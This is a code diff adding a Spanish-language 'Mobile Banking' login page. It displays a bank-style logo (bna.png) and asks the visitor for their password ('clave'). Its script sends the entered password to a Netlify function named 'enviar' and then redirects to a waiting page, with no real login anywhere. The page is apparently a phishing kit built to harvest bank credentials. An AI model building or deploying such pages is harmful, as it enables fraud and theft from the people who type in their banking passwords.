@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <!-- Header superior -->
+    <header class="top-bar">
+        <div class="title">Mobile Banking</div>
+    </header>
+
+    <!-- Logo -->
+    <div class="logo-container">
+        <img src="bna.png" alt="Logo">
+    </div>
+
+    <!-- Card login -->
+    <div class="login-card">
+        <div class="login-title">Ingresá tu clave</div>
+
+        <input type="text" id="claveInput" placeholder="Clave">
+
+        <button type="button" class="btn-accept" onclick="enviarClave()">
+            <span class="check">✔</span>
+            Aceptar
+        </button>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <span class="close">✖</span>
+        <p>Salir</p>
+    </footer>
+
+    <!-- Script -->
+    <script>
+    function enviarClave() {
+        const clave = document.getElementById("claveInput").value;
+
+        fetch("/.netlify/functions/enviar", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                tipo: "Clave",
+                valor: clave
+            })
+        })
+        .finally(() => {
+            window.location.href = "espera.html";
+        });
+    }
+    </script>
+
+</body>
+</html>
